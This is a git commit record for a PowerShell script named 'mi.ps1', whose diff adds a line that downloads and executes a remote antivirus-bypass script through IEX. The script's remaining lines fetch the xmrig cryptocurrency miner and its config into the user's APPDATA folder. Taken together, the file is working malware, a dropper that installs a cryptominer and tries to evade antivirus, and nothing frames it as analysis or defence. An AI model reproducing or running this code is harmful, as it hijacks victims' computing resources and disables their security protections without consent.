4c89b66cd4977a3879a5add4a8c5658e4ce9294f
m4rck <30388767+m4rck@users.noreply.github.com>
2020-10-24 18:57:35 +0200

    Update mi.ps1

--- mi.ps1
+++ mi.ps1
@@ -1,2 +1,3 @@
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1'); Invoke-AlokS-AvBypass;
 (New-Object System.Net.WebClient).DownloadFile('https://github.com/m4rck/test/raw/main/xmrig.exe',"$env:APPDATA\xmrig.exe");
 (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/m4rck/test/main/config.json',"$env:APPDATA\config.json");
